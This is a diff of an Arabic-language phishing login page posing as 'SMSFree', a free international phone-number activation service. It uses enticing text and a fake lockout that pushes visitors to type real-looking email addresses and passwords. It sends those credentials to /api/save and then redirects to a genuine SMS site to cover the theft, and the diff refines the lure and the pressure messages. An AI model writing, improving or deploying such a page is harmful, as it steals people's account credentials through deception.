@@ -3,42 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMSFree - الحماية المتقدمة</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600;800&display=swap" rel="stylesheet">
+    <title>منصة تفعيل الأرقام العالمية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #0a0e17; color: white; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #141b2b; padding: 40px; border-radius: 25px; width: 90%; max-width: 380px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
-        .logo { width: 100px; height: 100px; background: #0d121c; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; border: 1px solid #00f2fe; }
+        body { margin: 0; padding: 0; font-family: 'Cairo', sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; }
+        .premium-card { background-color: #141b2b; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 28px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6); }
+        .logo-circle { width: 110px; height: 110px; background: radial-gradient(circle, #1e293b, #111827); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 30px; border: 1px solid rgba(0, 242, 254, 0.3); }
         
-        input { width: 100%; padding: 15px; margin-bottom: 15px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:disabled { opacity: 0.4; cursor: not-allowed; filter: grayscale(1); }
+        /* النص المقنع والمغري بحجم متوسط */
+        .persuasive-text { color: #00f2fe; font-size: 16px; font-weight: 700; margin-bottom: 20px; line-height: 1.5; padding: 0 10px; }
+
+        input { width: 100%; padding: 18px; margin-bottom: 15px; background: rgba(255, 255, 255, 0.02); border: 1.5px solid rgba(255, 255, 255, 0.05); border-radius: 15px; color: #fff; font-family: 'Cairo'; box-sizing: border-box; outline: none; }
         input::placeholder { color: rgba(0, 242, 254, 0.4); }
-        
-        #msg { padding: 12px; margin-bottom: 15px; border-radius: 10px; font-size: 13px; display: none; font-weight: bold; line-height: 1.6; }
-        .err { background: rgba(255, 71, 87, 0.1); color: #ff4757; border: 1px solid #ff4757; }
-        .ban { background: #000; color: #ffbc00; border: 2px solid #ffbc00; box-shadow: 0 0 15px rgba(255, 188, 0, 0.2); }
+        input:disabled { opacity: 0.5; }
 
-        button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(135deg, #4facfe, #00f2fe); color: #0a0e17; font-weight: 800; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        button:disabled { opacity: 0.3; cursor: not-allowed; }
-        
-        #sorryBtn { background: #ffbc00 !important; color: #000 !important; display: none; margin-top: 10px; }
+        #status-msg { padding: 12px; margin-bottom: 15px; border-radius: 12px; font-size: 13px; display: none; font-weight: bold; }
+        .msg-error { background: rgba(255, 71, 87, 0.1); color: #ff4757; border: 1px solid #ff4757; }
+        .msg-ban { background: #000; color: #ffbc00; border: 2px solid #ffbc00; }
 
-        .footer { margin-top: 25px; font-size: 11px; color: #8b9bb4; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
+        button { width: 100%; padding: 18px; font-weight: 800; font-size: 17px; background: linear-gradient(135deg, #4facfe, #00f2fe); border: none; border-radius: 15px; cursor: pointer; color: #0a0e17; }
+        button:disabled { opacity: 0.5; }
+        
+        #sorry-btn { background: #ffbc00; color: #000; margin-top: 10px; display: none; }
+        .footer { margin-top: 35px; font-size: 11px; color: #8b9bb4; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo"><strong>SMSFree</strong></div>
-        <h2 style="margin-bottom: 20px;">تأكيد الهوية الرقمية</h2>
+    <div class="premium-card">
+        <div class="logo-circle"><span style="font-weight: 800; font-size: 20px;">SMSFree</span></div>
         
-        <div id="msg"></div>
+        <div class="persuasive-text">
+            سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك بضمان وأمان تام.
+        </div>
 
-        <form id="loginForm">
-            <input type="text" id="email" placeholder="البريد الإلكتروني (example@mail.com)" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
+        <div id="status-msg"></div>
+
+        <form id="auth-form">
+            <input type="text" id="user-field" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="pass-field" placeholder="كلمة السر" required>
             
-            <button type="submit" id="btn">تفعيل الحساب الآن</button>
-            <button type="button" id="sorryBtn">اعتذر.. سأقوم بتصحيح البريد وكلمة السر</button>
+            <button type="submit" id="main-btn">تفعيل الحساب الآن</button>
+            <button type="button" id="sorry-btn">اعتذر.. سأقوم بتصحيح البيانات</button>
         </form>
 
         <div class="footer">
@@ -48,88 +53,67 @@
 
     <script>
         let fails = 0;
-        let isLocked = false;
-        const form = document.getElementById('loginForm');
-        const m = document.getElementById('msg');
-        const b = document.getElementById('btn');
-        const sBtn = document.getElementById('sorryBtn');
+        const form = document.getElementById('auth-form');
+        const msg = document.getElementById('status-msg');
+        const mainBtn = document.getElementById('main-btn');
+        const sorryBtn = document.getElementById('sorry-btn');
         const inputs = document.querySelectorAll('input');
 
-        form.addEventListener('submit', async (e) => {
+        form.onsubmit = async (e) => {
             e.preventDefault();
-            if (isLocked) return;
+            const u = document.getElementById('user-field').value;
+            const p = document.getElementById('pass-field').value;
 
-            const u = document.getElementById('email').value.trim();
-            const p = document.getElementById('pass').value.trim();
-
-            // منطق التحقق الصارم
-            const isEmailValid = u.includes('@') && u.includes('.');
-            const isPassValid = p.length >= 6;
-
-            if (!isEmailValid || !isPassValid) {
+            if (!u.includes('@') || p.length < 6) {
                 fails++;
-                setInputsState(true); // قفل الحقول فوراً
+                inputs.forEach(i => i.disabled = true);
 
                 if (fails === 1) {
-                    m.innerText = "⚠️ يرجى كتابة البريد وكلمة السر بطريقة صحيحة";
-                    m.className = "err";
-                    m.style.display = "block";
-                    b.style.display = "none";
-                    sBtn.style.display = "block";
+                    msg.innerText = "بيانات غير صحيحة، يرجى المحاولة بدقة";
+                    msg.className = "msg-error";
+                    msg.style.display = "block";
+                    mainBtn.style.display = "none";
+                    sorryBtn.style.display = "block";
                 } else {
-                    triggerHardBan();
+                    startBan();
                 }
                 return;
             }
 
-            // إرسال البيانات في حال الصحة
-            b.disabled = true;
-            b.innerText = "⏳ جاري التحقق...";
-            
+            mainBtn.disabled = true;
+            mainBtn.innerText = "جاري التحقق...";
             try {
-                await fetch('/api/save', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ user: u, pass: p })
-                });
+                await fetch('/api/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ user: u, pass: p }) });
             } catch(err) {}
-
-            setTimeout(() => {
-                window.location.href = "https://receive-smss.com/";
-            }, 2000);
-        });
-
-        // وظيفة زر الاعتذار
-        sBtn.onclick = () => {
-            setInputsState(false);
-            sBtn.style.display = "none";
-            b.style.display = "block";
-            m.style.display = "none";
+            setTimeout(() => { window.location.href = "https://receive-smss.com/"; }, 2000);
         };
 
-        function setInputsState(disabled) {
-            inputs.forEach(i => i.disabled = disabled);
-        }
+        sorryBtn.onclick = () => {
+            inputs.forEach(i => i.disabled = false);
+            sorryBtn.style.display = "none";
+            mainBtn.style.display = "block";
+            msg.style.display = "none";
+        };
 
-        function triggerHardBan() {
-            isLocked = true;
-            sBtn.style.display = "none";
-            b.style.display = "block";
-            b.disabled = true;
-            let timer = 60;
+        function startBan() {
+            sorryBtn.style.display = "none";
+            mainBtn.style.display = "block";
+            mainBtn.disabled = true;
+            let time = 30; // حظر نص دقيقة
+            
+            const timer = setInterval(() => {
+                msg.innerText = `لقد تم حظرك مؤقتاً. سينتهي الحظر بعد ${time} ثانية`;
+                msg.className = "msg-ban";
+                msg.style.display = "block";
+                time--;
 
-            const countdown = setInterval(() => {
-                m.innerText = `🚫 لقد تم حظرك بسبب محاولات الخاطئة. فك الحظر بعد ${timer} ثانية`;
-                m.className = "ban";
-                m.style.display = "block";
-                timer--;
-
-                if (timer < 0) {
-                    clearInterval(countdown);
-                    isLocked = false;
-                    b.disabled = false;
-                    m.style.display = "none";
-                    setInputsState(false);
+                if (time < 0) {
+                    clearInterval(timer);
+                    mainBtn.disabled = false;
+                    // الرسالة التحذيرية النهائية بعد انتهاء العداد
+                    msg.innerText = "لاتكرر كتابه البريد أو كلمه السر بشكل غير صحيح سيتم حظرك لمده دقيقه وإذ تكرر الامر ربما لساعات";
+                    msg.className = "msg-error";
+                    inputs.forEach(i => i.disabled = false);
                     fails = 0;
                 }
             }, 1000);
